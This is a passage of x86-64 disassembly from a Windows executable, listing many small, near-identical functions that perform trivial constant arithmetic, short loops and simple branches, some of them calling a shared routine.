   14000216f:	5b                   	pop    %rbx
   140002170:	48 0f af c3          	imul   %rbx,%rax
   140002174:	48 83 c4 20          	add    $0x20,%rsp
   140002178:	41 5d                	pop    %r13
   14000217a:	41 5c                	pop    %r12
   14000217c:	5f                   	pop    %rdi
   14000217d:	5e                   	pop    %rsi
   14000217e:	5b                   	pop    %rbx
   14000217f:	c3                   	ret
   140002180:	53                   	push   %rbx
   140002181:	56                   	push   %rsi
   140002182:	57                   	push   %rdi
   140002183:	41 54                	push   %r12
   140002185:	41 55                	push   %r13
   140002187:	48 83 ec 20          	sub    $0x20,%rsp
   14000218b:	b8 1c 00 00 00       	mov    $0x1c,%eax
   140002190:	6b c0 20             	imul   $0x20,%eax,%eax
   140002193:	83 c0 12             	add    $0x12,%eax
   140002196:	83 e8 06             	sub    $0x6,%eax
   140002199:	f7 d8                	neg    %eax
   14000219b:	48 83 c4 20          	add    $0x20,%rsp
   14000219f:	41 5d                	pop    %r13
   1400021a1:	41 5c                	pop    %r12
   1400021a3:	5f                   	pop    %rdi
   1400021a4:	5e                   	pop    %rsi
   1400021a5:	5b                   	pop    %rbx
   1400021a6:	c3                   	ret
   1400021a7:	53                   	push   %rbx
   1400021a8:	56                   	push   %rsi
   1400021a9:	57                   	push   %rdi
   1400021aa:	41 54                	push   %r12
   1400021ac:	41 55                	push   %r13
   1400021ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400021b2:	b8 00 00 00 00       	mov    $0x0,%eax
   1400021b7:	bb da 00 00 00       	mov    $0xda,%ebx
   1400021bc:	21 d8                	and    %ebx,%eax
   1400021be:	09 c3                	or     %eax,%ebx
   1400021c0:	f7 d0                	not    %eax
   1400021c2:	01 d8                	add    %ebx,%eax
   1400021c4:	48 83 c4 20          	add    $0x20,%rsp
   1400021c8:	41 5d                	pop    %r13
   1400021ca:	41 5c                	pop    %r12
   1400021cc:	5f                   	pop    %rdi
   1400021cd:	5e                   	pop    %rsi
   1400021ce:	5b                   	pop    %rbx
   1400021cf:	c3                   	ret
   1400021d0:	53                   	push   %rbx
   1400021d1:	56                   	push   %rsi
   1400021d2:	57                   	push   %rdi
   1400021d3:	41 54                	push   %r12
   1400021d5:	41 55                	push   %r13
   1400021d7:	48 83 ec 20          	sub    $0x20,%rsp
   1400021db:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400021e0:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400021e5:	01 d8                	add    %ebx,%eax
   1400021e7:	d1 e0                	shl    $1,%eax
   1400021e9:	48 83 c4 20          	add    $0x20,%rsp
   1400021ed:	41 5d                	pop    %r13
   1400021ef:	41 5c                	pop    %r12
   1400021f1:	5f                   	pop    %rdi
   1400021f2:	5e                   	pop    %rsi
   1400021f3:	5b                   	pop    %rbx
   1400021f4:	c3                   	ret
   1400021f5:	53                   	push   %rbx
   1400021f6:	56                   	push   %rsi
   1400021f7:	57                   	push   %rdi
   1400021f8:	41 54                	push   %r12
   1400021fa:	41 55                	push   %r13
   1400021fc:	48 83 ec 20          	sub    $0x20,%rsp
   140002200:	e8 55 ee ff ff       	call   0x14000105a
   140002205:	25 ff 00 00 00       	and    $0xff,%eax
   14000220a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000220f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002214:	83 c0 02             	add    $0x2,%eax
   140002217:	ff c9                	dec    %ecx
   140002219:	75 f9                	jne    0x140002214
   14000221b:	48 83 c4 20          	add    $0x20,%rsp
   14000221f:	41 5d                	pop    %r13
   140002221:	41 5c                	pop    %r12
   140002223:	5f                   	pop    %rdi
   140002224:	5e                   	pop    %rsi
   140002225:	5b                   	pop    %rbx
   140002226:	c3                   	ret
   140002227:	53                   	push   %rbx
   140002228:	56                   	push   %rsi
   140002229:	57                   	push   %rdi
   14000222a:	41 54                	push   %r12
   14000222c:	41 55                	push   %r13
   14000222e:	48 83 ec 20          	sub    $0x20,%rsp
   140002232:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002237:	83 c0 2f             	add    $0x2f,%eax
   14000223a:	83 c0 01             	add    $0x1,%eax
   14000223d:	83 c0 07             	add    $0x7,%eax
   140002240:	48 83 c4 20          	add    $0x20,%rsp
   140002244:	41 5d                	pop    %r13
   140002246:	41 5c                	pop    %r12
   140002248:	5f                   	pop    %rdi
   140002249:	5e                   	pop    %rsi
   14000224a:	5b                   	pop    %rbx
   14000224b:	c3                   	ret
   14000224c:	53                   	push   %rbx
   14000224d:	56                   	push   %rsi
   14000224e:	57                   	push   %rdi
   14000224f:	41 54                	push   %r12
   140002251:	41 55                	push   %r13
   140002253:	48 83 ec 20          	sub    $0x20,%rsp
   140002257:	b8 1e 00 00 00       	mov    $0x1e,%eax
   14000225c:	6b c0 02             	imul   $0x2,%eax,%eax
   14000225f:	83 c0 16             	add    $0x16,%eax
   140002262:	6b c0 03             	imul   $0x3,%eax,%eax
   140002265:	48 83 c4 20          	add    $0x20,%rsp
   140002269:	41 5d                	pop    %r13
   14000226b:	41 5c                	pop    %r12
   14000226d:	5f                   	pop    %rdi
   14000226e:	5e                   	pop    %rsi
   14000226f:	5b                   	pop    %rbx
   140002270:	c3                   	ret
   140002271:	53                   	push   %rbx
   140002272:	56                   	push   %rsi
   140002273:	57                   	push   %rdi
   140002274:	41 54                	push   %r12
   140002276:	41 55                	push   %r13
   140002278:	48 83 ec 20          	sub    $0x20,%rsp
   14000227c:	e8 d9 ed ff ff       	call   0x14000105a
   140002281:	25 ff 00 00 00       	and    $0xff,%eax
   140002286:	b8 18 00 00 00       	mov    $0x18,%eax
   14000228b:	a9 01 00 00 00       	test   $0x1,%eax
   140002290:	74 05                	je     0x140002297
   140002292:	83 c0 0a             	add    $0xa,%eax
   140002295:	eb 03                	jmp    0x14000229a
   140002297:	83 e8 05             	sub    $0x5,%eax
   14000229a:	48 83 c4 20          	add    $0x20,%rsp
   14000229e:	41 5d                	pop    %r13
   1400022a0:	41 5c                	pop    %r12
   1400022a2:	5f                   	pop    %rdi
   1400022a3:	5e                   	pop    %rsi
   1400022a4:	5b                   	pop    %rbx
   1400022a5:	c3                   	ret
   1400022a6:	53                   	push   %rbx
   1400022a7:	56                   	push   %rsi
   1400022a8:	57                   	push   %rdi
   1400022a9:	41 54                	push   %r12
   1400022ab:	41 55                	push   %r13
   1400022ad:	48 83 ec 20          	sub    $0x20,%rsp
   1400022b1:	e8 a4 ed ff ff       	call   0x14000105a
   1400022b6:	25 ff 00 00 00       	and    $0xff,%eax
   1400022bb:	6a 1f                	push   $0x1f
   1400022bd:	6a 30                	push   $0x30
   1400022bf:	58                   	pop    %rax
   1400022c0:	5b                   	pop    %rbx
   1400022c1:	48 83 c4 20          	add    $0x20,%rsp
   1400022c5:	41 5d                	pop    %r13
   1400022c7:	41 5c                	pop    %r12
   1400022c9:	5f                   	pop    %rdi
   1400022ca:	5e                   	pop    %rsi
   1400022cb:	5b                   	pop    %rbx
   1400022cc:	c3                   	ret
   1400022cd:	53                   	push   %rbx
   1400022ce:	56                   	push   %rsi
   1400022cf:	57                   	push   %rdi
   1400022d0:	41 54                	push   %r12
   1400022d2:	41 55                	push   %r13
   1400022d4:	48 83 ec 20          	sub    $0x20,%rsp
   1400022d8:	e8 7d ed ff ff       	call   0x14000105a
   1400022dd:	25 ff 00 00 00       	and    $0xff,%eax
   1400022e2:	b8 53 00 00 00       	mov    $0x53,%eax
   1400022e7:	bb 07 00 00 00       	mov    $0x7,%ebx
   1400022ec:	01 d8                	add    %ebx,%eax
   1400022ee:	d1 e0                	shl    $1,%eax
   1400022f0:	48 83 c4 20          	add    $0x20,%rsp
   1400022f4:	41 5d                	pop    %r13
   1400022f6:	41 5c                	pop    %r12
   1400022f8:	5f                   	pop    %rdi
   1400022f9:	5e                   	pop    %rsi
   1400022fa:	5b                   	pop    %rbx
   1400022fb:	c3                   	ret
   1400022fc:	53                   	push   %rbx
   1400022fd:	56                   	push   %rsi
   1400022fe:	57                   	push   %rdi
   1400022ff:	41 54                	push   %r12
   140002301:	41 55                	push   %r13
   140002303:	48 83 ec 20          	sub    $0x20,%rsp
   140002307:	e8 4e ed ff ff       	call   0x14000105a
   14000230c:	25 ff 00 00 00       	and    $0xff,%eax
   140002311:	b8 3d 00 00 00       	mov    $0x3d,%eax
   140002316:	bb 28 00 00 00       	mov    $0x28,%ebx
   14000231b:	39 d8                	cmp    %ebx,%eax
   14000231d:	7f 04                	jg     0x140002323
   14000231f:	01 d8                	add    %ebx,%eax
   140002321:	eb 02                	jmp    0x140002325
   140002323:	29 d8                	sub    %ebx,%eax
   140002325:	48 83 c4 20          	add    $0x20,%rsp
   140002329:	41 5d                	pop    %r13
   14000232b:	41 5c                	pop    %r12
   14000232d:	5f                   	pop    %rdi
   14000232e:	5e                   	pop    %rsi
   14000232f:	5b                   	pop    %rbx
   140002330:	c3                   	ret
   140002331:	53                   	push   %rbx
   140002332:	56                   	push   %rsi
   140002333:	57                   	push   %rdi
   140002334:	41 54                	push   %r12
   140002336:	41 55                	push   %r13
   140002338:	48 83 ec 20          	sub    $0x20,%rsp
   14000233c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002341:	31 c0                	xor    %eax,%eax
   140002343:	01 c8                	add    %ecx,%eax
   140002345:	ff c9                	dec    %ecx
   140002347:	75 fa                	jne    0x140002343
   140002349:	48 83 c4 20          	add    $0x20,%rsp
   14000234d:	41 5d                	pop    %r13
   14000234f:	41 5c                	pop    %r12
   140002351:	5f                   	pop    %rdi
   140002352:	5e                   	pop    %rsi
   140002353:	5b                   	pop    %rbx
   140002354:	c3                   	ret
   140002355:	53                   	push   %rbx
   140002356:	56                   	push   %rsi
   140002357:	57                   	push   %rdi
   140002358:	41 54                	push   %r12
   14000235a:	41 55                	push   %r13
   14000235c:	48 83 ec 20          	sub    $0x20,%rsp
   140002360:	e8 f5 ec ff ff       	call   0x14000105a
   140002365:	25 ff 00 00 00       	and    $0xff,%eax
   14000236a:	b8 d8 00 00 00       	mov    $0xd8,%eax
   14000236f:	bb d4 00 00 00       	mov    $0xd4,%ebx
   140002374:	21 d8                	and    %ebx,%eax
   140002376:	09 c3                	or     %eax,%ebx
   140002378:	f7 d0                	not    %eax
   14000237a:	01 d8                	add    %ebx,%eax
   14000237c:	48 83 c4 20          	add    $0x20,%rsp
   140002380:	41 5d                	pop    %r13
   140002382:	41 5c                	pop    %r12
   140002384:	5f                   	pop    %rdi
   140002385:	5e                   	pop    %rsi
   140002386:	5b                   	pop    %rbx
   140002387:	c3                   	ret
   140002388:	53                   	push   %rbx
   140002389:	56                   	push   %rsi
   14000238a:	57                   	push   %rdi
   14000238b:	41 54                	push   %r12
   14000238d:	41 55                	push   %r13
   14000238f:	48 83 ec 20          	sub    $0x20,%rsp
   140002393:	b8 01 00 00 00       	mov    $0x1,%eax
   140002398:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000239d:	6b c0 02             	imul   $0x2,%eax,%eax
   1400023a0:	ff c9                	dec    %ecx
   1400023a2:	75 f9                	jne    0x14000239d
   1400023a4:	48 83 c4 20          	add    $0x20,%rsp
   1400023a8:	41 5d                	pop    %r13
   1400023aa:	41 5c                	pop    %r12
   1400023ac:	5f                   	pop    %rdi
   1400023ad:	5e                   	pop    %rsi
   1400023ae:	5b                   	pop    %rbx
   1400023af:	c3                   	ret
   1400023b0:	53                   	push   %rbx
   1400023b1:	56                   	push   %rsi
   1400023b2:	57                   	push   %rdi
   1400023b3:	41 54                	push   %r12
   1400023b5:	41 55                	push   %r13
   1400023b7:	48 83 ec 20          	sub    $0x20,%rsp
   1400023bb:	b8 98 00 00 00       	mov    $0x98,%eax
   1400023c0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400023c5:	31 d2                	xor    %edx,%edx
   1400023c7:	f7 f1                	div    %ecx
   1400023c9:	48 83 c4 20          	add    $0x20,%rsp
   1400023cd:	41 5d                	pop    %r13
   1400023cf:	41 5c                	pop    %r12
   1400023d1:	5f                   	pop    %rdi
   1400023d2:	5e                   	pop    %rsi
   1400023d3:	5b                   	pop    %rbx
   1400023d4:	c3                   	ret
   1400023d5:	53                   	push   %rbx
   1400023d6:	56                   	push   %rsi
   1400023d7:	57                   	push   %rdi
   1400023d8:	41 54                	push   %r12
   1400023da:	41 55                	push   %r13
   1400023dc:	48 83 ec 20          	sub    $0x20,%rsp
   1400023e0:	b8 37 00 00 00       	mov    $0x37,%eax
   1400023e5:	bb 25 00 00 00       	mov    $0x25,%ebx
   1400023ea:	01 d8                	add    %ebx,%eax
   1400023ec:	d1 e0                	shl    $1,%eax
   1400023ee:	48 83 c4 20          	add    $0x20,%rsp
   1400023f2:	41 5d                	pop    %r13
   1400023f4:	41 5c                	pop    %r12
   1400023f6:	5f                   	pop    %rdi
   1400023f7:	5e                   	pop    %rsi
   1400023f8:	5b                   	pop    %rbx
   1400023f9:	c3                   	ret
   1400023fa:	53                   	push   %rbx
   1400023fb:	56                   	push   %rsi
   1400023fc:	57                   	push   %rdi
   1400023fd:	41 54                	push   %r12
   1400023ff:	41 55                	push   %r13
   140002401:	48 83 ec 20          	sub    $0x20,%rsp
   140002405:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
   14000240c:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140002410:	48 01 d8             	add    %rbx,%rax
   140002413:	48 83 c4 20          	add    $0x20,%rsp
   140002417:	41 5d                	pop    %r13
   140002419:	41 5c                	pop    %r12
   14000241b:	5f                   	pop    %rdi
   14000241c:	5e                   	pop    %rsi
   14000241d:	5b                   	pop    %rbx
   14000241e:	c3                   	ret
   14000241f:	53                   	push   %rbx
   140002420:	56                   	push   %rsi
   140002421:	57                   	push   %rdi
   140002422:	41 54                	push   %r12
   140002424:	41 55                	push   %r13
   140002426:	48 83 ec 20          	sub    $0x20,%rsp
   14000242a:	e8 2b ec ff ff       	call   0x14000105a
   14000242f:	25 ff 00 00 00       	and    $0xff,%eax
   140002434:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002439:	31 c0                	xor    %eax,%eax
   14000243b:	83 c0 02             	add    $0x2,%eax
   14000243e:	ff c9                	dec    %ecx
   140002440:	75 f9                	jne    0x14000243b
   140002442:	48 83 c4 20          	add    $0x20,%rsp
   140002446:	41 5d                	pop    %r13
   140002448:	41 5c                	pop    %r12
   14000244a:	5f                   	pop    %rdi
   14000244b:	5e                   	pop    %rsi
   14000244c:	5b                   	pop    %rbx
   14000244d:	c3                   	ret
   14000244e:	53                   	push   %rbx
   14000244f:	56                   	push   %rsi
   140002450:	57                   	push   %rdi
   140002451:	41 54                	push   %r12
   140002453:	41 55                	push   %r13
   140002455:	48 83 ec 20          	sub    $0x20,%rsp
   140002459:	b8 0c 00 00 00       	mov    $0xc,%eax
   14000245e:	bb 37 00 00 00       	mov    $0x37,%ebx
   140002463:	b9 59 00 00 00       	mov    $0x59,%ecx
   140002468:	01 d8                	add    %ebx,%eax
   14000246a:	01 c8                	add    %ecx,%eax
   14000246c:	48 83 c4 20          	add    $0x20,%rsp
   140002470:	41 5d                	pop    %r13
   140002472:	41 5c                	pop    %r12
   140002474:	5f                   	pop    %rdi
   140002475:	5e                   	pop    %rsi
   140002476:	5b                   	pop    %rbx
   140002477:	c3                   	ret
   140002478:	53                   	push   %rbx
   140002479:	56                   	push   %rsi
   14000247a:	57                   	push   %rdi
   14000247b:	41 54                	push   %r12
   14000247d:	41 55                	push   %r13
   14000247f:	48 83 ec 20          	sub    $0x20,%rsp
   140002483:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002488:	bb 35 00 00 00       	mov    $0x35,%ebx
   14000248d:	b9 4b 00 00 00       	mov    $0x4b,%ecx
   140002492:	01 d8                	add    %ebx,%eax
   140002494:	01 c8                	add    %ecx,%eax
   140002496:	48 83 c4 20          	add    $0x20,%rsp
   14000249a:	41 5d                	pop    %r13
   14000249c:	41 5c                	pop    %r12
   14000249e:	5f                   	pop    %rdi
   14000249f:	5e                   	pop    %rsi
   1400024a0:	5b                   	pop    %rbx
   1400024a1:	c3                   	ret
   1400024a2:	53                   	push   %rbx
   1400024a3:	56                   	push   %rsi
   1400024a4:	57                   	push   %rdi
   1400024a5:	41 54                	push   %r12
   1400024a7:	41 55                	push   %r13
   1400024a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400024ad:	b8 54 00 00 00       	mov    $0x54,%eax
   1400024b2:	c1 e0 02             	shl    $0x2,%eax
   1400024b5:	d1 e8                	shr    $1,%eax
   1400024b7:	83 e0 0f             	and    $0xf,%eax
   1400024ba:	48 83 c4 20          	add    $0x20,%rsp
   1400024be:	41 5d                	pop    %r13
   1400024c0:	41 5c                	pop    %r12
   1400024c2:	5f                   	pop    %rdi
   1400024c3:	5e                   	pop    %rsi
   1400024c4:	5b                   	pop    %rbx
   1400024c5:	c3                   	ret
   1400024c6:	53                   	push   %rbx
   1400024c7:	56                   	push   %rsi
   1400024c8:	57                   	push   %rdi
   1400024c9:	41 54                	push   %r12
   1400024cb:	41 55                	push   %r13
   1400024cd:	48 83 ec 20          	sub    $0x20,%rsp
   1400024d1:	e8 84 eb ff ff       	call   0x14000105a
   1400024d6:	25 ff 00 00 00       	and    $0xff,%eax
   1400024db:	b8 21 00 00 00       	mov    $0x21,%eax
   1400024e0:	83 c0 0b             	add    $0xb,%eax
   1400024e3:	72 05                	jb     0x1400024ea
   1400024e5:	83 c0 05             	add    $0x5,%eax
   1400024e8:	eb 03                	jmp    0x1400024ed
   1400024ea:	83 c0 0a             	add    $0xa,%eax
   1400024ed:	48 83 c4 20          	add    $0x20,%rsp
   1400024f1:	41 5d                	pop    %r13
   1400024f3:	41 5c                	pop    %r12
   1400024f5:	5f                   	pop    %rdi
   1400024f6:	5e                   	pop    %rsi
   1400024f7:	5b                   	pop    %rbx
   1400024f8:	c3                   	ret
   1400024f9:	53                   	push   %rbx
   1400024fa:	56                   	push   %rsi
   1400024fb:	57                   	push   %rdi
   1400024fc:	41 54                	push   %r12
   1400024fe:	41 55                	push   %r13
   140002500:	48 83 ec 20          	sub    $0x20,%rsp
   140002504:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002509:	bb 23 00 00 00       	mov    $0x23,%ebx
   14000250e:	b9 43 00 00 00       	mov    $0x43,%ecx
   140002513:	01 d8                	add    %ebx,%eax
   140002515:	01 c1                	add    %eax,%ecx
   140002517:	48 83 c4 20          	add    $0x20,%rsp
   14000251b:	41 5d                	pop    %r13
   14000251d:	41 5c                	pop    %r12
   14000251f:	5f                   	pop    %rdi
   140002520:	5e                   	pop    %rsi
   140002521:	5b                   	pop    %rbx
   140002522:	c3                   	ret
   140002523:	53                   	push   %rbx
   140002524:	56                   	push   %rsi
   140002525:	57                   	push   %rdi
   140002526:	41 54                	push   %r12
   140002528:	41 55                	push   %r13
   14000252a:	48 83 ec 20          	sub    $0x20,%rsp
   14000252e:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   140002535:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140002539:	48 01 d8             	add    %rbx,%rax
   14000253c:	48 83 c4 20          	add    $0x20,%rsp
   140002540:	41 5d                	pop    %r13
   140002542:	41 5c                	pop    %r12
   140002544:	5f                   	pop    %rdi
   140002545:	5e                   	pop    %rsi
   140002546:	5b                   	pop    %rbx
   140002547:	c3                   	ret
   140002548:	53                   	push   %rbx
   140002549:	56                   	push   %rsi
   14000254a:	57                   	push   %rdi
   14000254b:	41 54                	push   %r12
   14000254d:	41 55                	push   %r13
   14000254f:	48 83 ec 20          	sub    $0x20,%rsp
   140002553:	b8 39 00 00 00       	mov    $0x39,%eax
   140002558:	83 c0 02             	add    $0x2,%eax
   14000255b:	83 c0 16             	add    $0x16,%eax
   14000255e:	83 c0 0a             	add    $0xa,%eax
   140002561:	48 83 c4 20          	add    $0x20,%rsp
   140002565:	41 5d                	pop    %r13
   140002567:	41 5c                	pop    %r12
   140002569:	5f                   	pop    %rdi
   14000256a:	5e                   	pop    %rsi
   14000256b:	5b                   	pop    %rbx
   14000256c:	c3                   	ret
   14000256d:	53                   	push   %rbx
   14000256e:	56                   	push   %rsi
   14000256f:	57                   	push   %rdi
   140002570:	41 54                	push   %r12
   140002572:	41 55                	push   %r13
   140002574:	48 83 ec 20          	sub    $0x20,%rsp
   140002578:	e8 dd ea ff ff       	call   0x14000105a
   14000257d:	25 ff 00 00 00       	and    $0xff,%eax
   140002582:	b8 01 00 00 00       	mov    $0x1,%eax
   140002587:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000258c:	0f af c1             	imul   %ecx,%eax
   14000258f:	ff c9                	dec    %ecx
   140002591:	75 f9                	jne    0x14000258c
   140002593:	48 83 c4 20          	add    $0x20,%rsp
   140002597:	41 5d                	pop    %r13
   140002599:	41 5c                	pop    %r12
   14000259b:	5f                   	pop    %rdi
   14000259c:	5e                   	pop    %rsi
   14000259d:	5b                   	pop    %rbx
   14000259e:	c3                   	ret
   14000259f:	53                   	push   %rbx
   1400025a0:	56                   	push   %rsi
   1400025a1:	57                   	push   %rdi
   1400025a2:	41 54                	push   %r12
   1400025a4:	41 55                	push   %r13
   1400025a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400025aa:	b8 49 00 00 00       	mov    $0x49,%eax
   1400025af:	bb 10 00 00 00       	mov    $0x10,%ebx
   1400025b4:	01 d8                	add    %ebx,%eax
   1400025b6:	89 c1                	mov    %eax,%ecx
   1400025b8:	01 cb                	add    %ecx,%ebx
   1400025ba:	48 83 c4 20          	add    $0x20,%rsp
   1400025be:	41 5d                	pop    %r13
   1400025c0:	41 5c                	pop    %r12
   1400025c2:	5f                   	pop    %rdi
   1400025c3:	5e                   	pop    %rsi
   1400025c4:	5b                   	pop    %rbx
   1400025c5:	c3                   	ret
   1400025c6:	53                   	push   %rbx
   1400025c7:	56                   	push   %rsi
   1400025c8:	57                   	push   %rdi
   1400025c9:	41 54                	push   %r12
   1400025cb:	41 55                	push   %r13
   1400025cd:	48 83 ec 20          	sub    $0x20,%rsp
   1400025d1:	e8 84 ea ff ff       	call   0x14000105a
   1400025d6:	25 ff 00 00 00       	and    $0xff,%eax
   1400025db:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400025e0:	83 c0 21             	add    $0x21,%eax
   1400025e3:	83 c0 08             	add    $0x8,%eax
   1400025e6:	83 c0 0b             	add    $0xb,%eax
   1400025e9:	48 83 c4 20          	add    $0x20,%rsp
   1400025ed:	41 5d                	pop    %r13
   1400025ef:	41 5c                	pop    %r12
   1400025f1:	5f                   	pop    %rdi
   1400025f2:	5e                   	pop    %rsi
   1400025f3:	5b                   	pop    %rbx
   1400025f4:	c3                   	ret
   1400025f5:	53                   	push   %rbx
   1400025f6:	56                   	push   %rsi
   1400025f7:	57                   	push   %rdi
   1400025f8:	41 54                	push   %r12
   1400025fa:	41 55                	push   %r13
   1400025fc:	48 83 ec 20          	sub    $0x20,%rsp
   140002600:	b8 4f 00 00 00       	mov    $0x4f,%eax
   140002605:	bb 09 00 00 00       	mov    $0x9,%ebx
   14000260a:	01 d8                	add    %ebx,%eax
   14000260c:	d1 e0                	shl    $1,%eax
   14000260e:	48 83 c4 20          	add    $0x20,%rsp
   140002612:	41 5d                	pop    %r13
   140002614:	41 5c                	pop    %r12
   140002616:	5f                   	pop    %rdi
   140002617:	5e                   	pop    %rsi
   140002618:	5b                   	pop    %rbx
   140002619:	c3                   	ret
   14000261a:	53                   	push   %rbx
   14000261b:	56                   	push   %rsi
   14000261c:	57                   	push   %rdi
   14000261d:	41 54                	push   %r12
   14000261f:	41 55                	push   %r13
   140002621:	48 83 ec 20          	sub    $0x20,%rsp
   140002625:	b8 53 00 00 00       	mov    $0x53,%eax
   14000262a:	c1 c0 02             	rol    $0x2,%eax
   14000262d:	83 e0 0f             	and    $0xf,%eax
   140002630:	48 83 c4 20          	add    $0x20,%rsp
   140002634:	41 5d                	pop    %r13
   140002636:	41 5c                	pop    %r12
   140002638:	5f                   	pop    %rdi
   140002639:	5e                   	pop    %rsi
   14000263a:	5b                   	pop    %rbx
   14000263b:	c3                   	ret
   14000263c:	53                   	push   %rbx
   14000263d:	56                   	push   %rsi
   14000263e:	57                   	push   %rdi
   14000263f:	41 54                	push   %r12
   140002641:	41 55                	push   %r13
   140002643:	48 83 ec 20          	sub    $0x20,%rsp
   140002647:	e8 0e ea ff ff       	call   0x14000105a
   14000264c:	25 ff 00 00 00       	and    $0xff,%eax
   140002651:	6a 0b                	push   $0xb
   140002653:	6a 02                	push   $0x2
   140002655:	58                   	pop    %rax
   140002656:	5b                   	pop    %rbx
   140002657:	48 01 d8             	add    %rbx,%rax
   14000265a:	48 83 c4 20          	add    $0x20,%rsp
   14000265e:	41 5d                	pop    %r13
   140002660:	41 5c                	pop    %r12
   140002662:	5f                   	pop    %rdi
   140002663:	5e                   	pop    %rsi
   140002664:	5b                   	pop    %rbx
   140002665:	c3                   	ret
   140002666:	53                   	push   %rbx
   140002667:	56                   	push   %rsi
   140002668:	57                   	push   %rdi
   140002669:	41 54                	push   %r12
   14000266b:	41 55                	push   %r13
   14000266d:	48 83 ec 20          	sub    $0x20,%rsp
   140002671:	b8 18 00 00 00       	mov    $0x18,%eax
   140002676:	83 e0 01             	and    $0x1,%eax
   140002679:	74 07                	je     0x140002682
   14000267b:	b8 5a 00 00 00       	mov    $0x5a,%eax
   140002680:	eb 05                	jmp    0x140002687
   140002682:	b8 17 00 00 00       	mov    $0x17,%eax
   140002687:	48 83 c4 20          	add    $0x20,%rsp
   14000268b:	41 5d                	pop    %r13
   14000268d:	41 5c                	pop    %r12
   14000268f:	5f                   	pop    %rdi
   140002690:	5e                   	pop    %rsi
   140002691:	5b                   	pop    %rbx
   140002692:	c3                   	ret
   140002693:	53                   	push   %rbx
   140002694:	56                   	push   %rsi
   140002695:	57                   	push   %rdi
   140002696:	41 54                	push   %r12
   140002698:	41 55                	push   %r13
   14000269a:	48 83 ec 20          	sub    $0x20,%rsp
   14000269e:	b8 fe 00 00 00       	mov    $0xfe,%eax
   1400026a3:	c1 c0 02             	rol    $0x2,%eax
   1400026a6:	83 e0 0f             	and    $0xf,%eax
   1400026a9:	48 83 c4 20          	add    $0x20,%rsp
   1400026ad:	41 5d                	pop    %r13
   1400026af:	41 5c                	pop    %r12
   1400026b1:	5f                   	pop    %rdi
   1400026b2:	5e                   	pop    %rsi
   1400026b3:	5b                   	pop    %rbx
   1400026b4:	c3                   	ret
   1400026b5:	53                   	push   %rbx
   1400026b6:	56                   	push   %rsi
   1400026b7:	57                   	push   %rdi
   1400026b8:	41 54                	push   %r12
   1400026ba:	41 55                	push   %r13
   1400026bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400026c0:	b8 21 00 00 00       	mov    $0x21,%eax
   1400026c5:	83 e0 01             	and    $0x1,%eax
   1400026c8:	74 07                	je     0x1400026d1
   1400026ca:	b8 3b 00 00 00       	mov    $0x3b,%eax
   1400026cf:	eb 05                	jmp    0x1400026d6
   1400026d1:	b8 1d 00 00 00       	mov    $0x1d,%eax
   1400026d6:	48 83 c4 20          	add    $0x20,%rsp
   1400026da:	41 5d                	pop    %r13
   1400026dc:	41 5c                	pop    %r12
   1400026de:	5f                   	pop    %rdi
   1400026df:	5e                   	pop    %rsi
   1400026e0:	5b                   	pop    %rbx
   1400026e1:	c3                   	ret
   1400026e2:	53                   	push   %rbx
   1400026e3:	56                   	push   %rsi
   1400026e4:	57                   	push   %rdi
   1400026e5:	41 54                	push   %r12
   1400026e7:	41 55                	push   %r13
   1400026e9:	48 83 ec 20          	sub    $0x20,%rsp
   1400026ed:	31 c0                	xor    %eax,%eax
   1400026ef:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400026f4:	83 c0 02             	add    $0x2,%eax
   1400026f7:	83 f8 0a             	cmp    $0xa,%eax
   1400026fa:	7f 04                	jg     0x140002700
   1400026fc:	ff c9                	dec    %ecx
   1400026fe:	75 f4                	jne    0x1400026f4
   140002700:	48 83 c4 20          	add    $0x20,%rsp
   140002704:	41 5d                	pop    %r13
   140002706:	41 5c                	pop    %r12
   140002708:	5f                   	pop    %rdi
   140002709:	5e                   	pop    %rsi
   14000270a:	5b                   	pop    %rbx
   14000270b:	c3                   	ret
   14000270c:	53                   	push   %rbx
   14000270d:	56                   	push   %rsi
   14000270e:	57                   	push   %rdi
   14000270f:	41 54                	push   %r12
   140002711:	41 55                	push   %r13
   140002713:	48 83 ec 20          	sub    $0x20,%rsp
   140002717:	b8 09 00 00 00       	mov    $0x9,%eax
   14000271c:	6b c0 02             	imul   $0x2,%eax,%eax
   14000271f:	83 c0 04             	add    $0x4,%eax
   140002722:	6b c0 03             	imul   $0x3,%eax,%eax
   140002725:	48 83 c4 20          	add    $0x20,%rsp
   140002729:	41 5d                	pop    %r13
   14000272b:	41 5c                	pop    %r12
   14000272d:	5f                   	pop    %rdi
   14000272e:	5e                   	pop    %rsi
   14000272f:	5b                   	pop    %rbx
   140002730:	c3                   	ret
   140002731:	53                   	push   %rbx
   140002732:	56                   	push   %rsi
   140002733:	57                   	push   %rdi
   140002734:	41 54                	push   %r12
   140002736:	41 55                	push   %r13
   140002738:	48 83 ec 20          	sub    $0x20,%rsp
   14000273c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002741:	31 c0                	xor    %eax,%eax
   140002743:	83 c0 02             	add    $0x2,%eax
   140002746:	ff c9                	dec    %ecx
   140002748:	75 f9                	jne    0x140002743
   14000274a:	48 83 c4 20          	add    $0x20,%rsp
   14000274e:	41 5d                	pop    %r13
   140002750:	41 5c                	pop    %r12
   140002752:	5f                   	pop    %rdi
   140002753:	5e                   	pop    %rsi
   140002754:	5b                   	pop    %rbx
   140002755:	c3                   	ret
   140002756:	53                   	push   %rbx
   140002757:	56                   	push   %rsi
